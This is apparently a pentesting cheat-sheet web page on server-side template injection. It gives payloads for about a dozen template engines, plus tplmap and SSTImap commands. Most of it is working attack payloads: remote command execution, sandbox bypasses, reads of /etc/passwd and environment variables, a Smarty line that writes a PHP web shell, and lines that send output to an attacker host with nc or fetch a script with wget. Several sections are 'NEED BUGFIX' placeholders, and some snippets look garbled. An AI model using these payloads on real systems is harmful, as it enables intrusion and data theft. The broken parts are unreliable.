+++
title = "Server-Side Template Injection"
date = '2022-10-16'
description = 'All about server-side template injection techniques, methods, payloads, how/why/when they work.'
include_toc = 'true'
+++
# Server-Side Template Injections

## Note that Hugo still has some difficulty handling certain strings in certain manners here and it's under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware

> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages

## Tools

Recommended tools: 

[Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool

e.g:

```bash
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

[SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)

e.g:

```bash
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

## Methodology

![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)

---
## Detection

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :

### NEED BUGFIX FOR THIS POLYGLOT

## ASP.NET Razor

[Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)
> Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.

### ASP.NET Razor - Basic injection

```powershell
@(1+2)
```

### ASP.NET Razor - Command execution

```csharp
@{
  // C# code
}
```

---

## Expression Language EL

[Official website](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)
> Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0

### Expression Language EL - Basic injection

```java
${1+1}
#{1+1}
```

### Expression Language EL - One-Liner injections not including code execution

```java
// DNS Lookup
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}

// JVM System Property Lookup (ex: java.class.path)
${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
```

### Expression Language EL - Code Execution

```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using process builder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
```

---

## Freemarker

[Official website](https://freemarker.apache.org/)
> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic injection

The template can be `${3*3}` or the legacy `#{3*3}`.

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

### Freemarker - Code execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Freemarker - Sandbox bypass

:warning: only works on Freemarker versions below 2.3.30

```javascript
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Groovy

[Official website](https://groovy-lang.org/)

### Groovy - Basic injection

Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.

### Groovy - Read and create File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP request:

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### NEED BUGFIX FOR HANDLEBARS

---

## Jade / Codepen

[Official website](https://codepen.io/)
> 

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Java

### Java - Basic injection
> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
### NEED BUGFIX FOR SOME JAVA

### Java - Retrieve the system’s environment variables

```java
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Django Templates

Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.

### NEED BUGFIX FOR DJANGO

## Jinja2

[Official website](https://jinja.palletsprojects.com/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  

### NEED BUGFIX FOR JINJA2

---

## Jinjava

[Official website](https://github.com/HubSpot/jinjava)
> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).

### NEED BUGFIX FOR JINJAVA

---

## Lessjs

[Official website](https://lesscss.org/)
> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.

### Lessjs - SSRF / LFI

```less
@import (inline) "http://localhost";
// or
@import (inline) "/etc/passwd";
```

### Lessjs < v3 - Command Execution

```less
body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
```

### Plugins

Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.

```less
// example local plugin usage
@plugin "plugin-2.7.js";
```
or
```less
// example remote plugin usage
@plugin "http://example.com/plugin-2.7.js"
```

version 2 example RCE plugin:

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```
version 3 and above example RCE plugin

```javascript
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

---

## Mako

[Official website](https://www.makotemplates.org/)
> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Direct access to os from TemplateNamespace:

Any of these payloads allows direct access to the `os` module

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)


---

## Pebble

[Official website](https://pebbletemplates.io/)
> Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### NEED BUGFIX FOR PEBBLE

---

## Ruby

### Ruby - Basic injections

ERB:

```ruby
<%= 7 * 7 %>
```

Slim:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Code execution

Execute code using SSTI for ERB engine.

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for Slim engine.

```ruby
#{ %x|env| }
```

---

## Smarty

[Official website](https://www.smarty.net/docs/en/)
> Smarty is a template engine for PHP.

```python
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

---

## Twig

[Official website](https://twig.symfony.com/)
> Twig is a modern template engine for PHP.

### Twig - Basic injection

### NEED BUGFIX FOR TWIG

### Twig - Template format

```python
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```
---

## Velocity

[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib and HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.

controller:

```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```

page template:

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

layout template:

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

---

## References

* [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
* [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
* [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
* [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
* [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
* [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
* [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
* [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
* [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
* [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
* [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
* [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
